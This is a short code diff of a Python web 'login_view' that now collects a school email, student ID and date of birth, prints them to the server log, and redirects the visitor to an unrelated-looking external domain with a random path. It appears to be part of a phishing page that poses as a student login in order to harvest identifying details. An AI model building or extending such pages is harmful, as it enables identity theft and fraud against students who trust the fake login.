@@ -6,18 +6,17 @@ def login_view(request):
 
     if request.method == "POST":
 
-        schoolName = request.POST.get("studentName")
-        studentName = request.POST.get("studentName")
+        schoolemail = request.POST.get("schoolemail")
         studentId = request.POST.get("studentId")
         dob = request.POST.get("dob")
 
 
-        print(schoolName)
-        print(studentName)
+      
+        print(schoolemail)
         print(studentId)
         print(dob)
 
 
-        return redirect('')
+        return redirect('https://bm.technologies.newstudents.online/xamDpLcc')
 
     return render(request, "login.html")
